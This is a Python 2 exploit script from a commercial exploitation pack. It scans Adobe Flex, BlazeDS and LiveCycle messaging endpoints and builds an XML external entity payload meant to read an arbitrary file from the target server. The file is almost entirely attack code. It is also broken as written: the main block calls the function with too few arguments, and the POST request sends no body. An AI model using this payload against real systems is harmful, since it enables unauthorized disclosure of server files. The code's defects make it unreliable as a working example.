#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import httplib
import sys
import proto.http

def adobe_xml_injection(host, port, fname):
  urls = []
  tochecks = [
    '/flex2gateway',
    '/flex2gateway/http',
    '/flex2gateway/httpsecure',
    '/flex2gateway/cfamfpolling',
    '/flex2gateway/amf',
    '/flex2gateway/amfpolling',
    '/messagebroker/http',
    '/messagebroker/httpsecure',
    '/blazeds/messagebroker/http',
    '/blazeds/messagebroker/httpsecure',
    '/samples/messagebroker/http',
    '/samples/messagebroker/httpsecure',
    '/lcds/messagebroker/http',
    '/lcds/messagebroker/httpsecure',
    '/lcds-samples/messagebroker/http',
    '/lcds-samples/messagebroker/httpsecure',
  ]
  for tocheck in tochecks:
    try:
      (status, headers, body) = proto.http.send_get_request(host, port, tocheck, {})
    except:
      continue
    if status == 200:
      urls.append(tocheck)

  post = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [ <!ENTITY x3 SYSTEM "%s"> ]>
<amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx">
<body>
<object type="flex.messaging.messages.CommandMessage">
<traits>
<string>body</string><string>clientId</string><string>correlationId</string>
<string>destination</string><string>headers</string><string>messageId</string>
<string>operation</string><string>timestamp</string><string>timeToLive</string>
</traits><object><traits />
</object>
<null /><string /><string />
<object>
<traits>
<string>DSId</string><string>DSMessagingVersion</string>
</traits>
<string>nil</string><int>2</int>
</object>
<string>&x3;</string>
<int>5</int><int>0</int><int>0</int>
</object>
</body>
</amfx>""" % fname

  nfo = ''
  for url in urls:
    headers = {
      'Content-type': 'application/x-amf', 
      'Content-length': '%i' % len(post),
    }
    (status, headers, body) = proto.http.send_post_request(host, port, url, None, headers)
    if status == 200:
      nfo = body
      if body.find('<?xml version="1.0" encoding="utf-8"?>') > -1:
        if body.find('<null/>') > -1:
          return '<null> found: error with pathname or file permissions'
        break  
  return nfo

if __name__ == "__main__":
  try:
    host = sys.argv[1]
    fname = sys.argv[2]
  except:
    print "%s host fname" % sys.argv[0]
    sys.exit(-1)
  print adobe_xml_injection(host, fname)

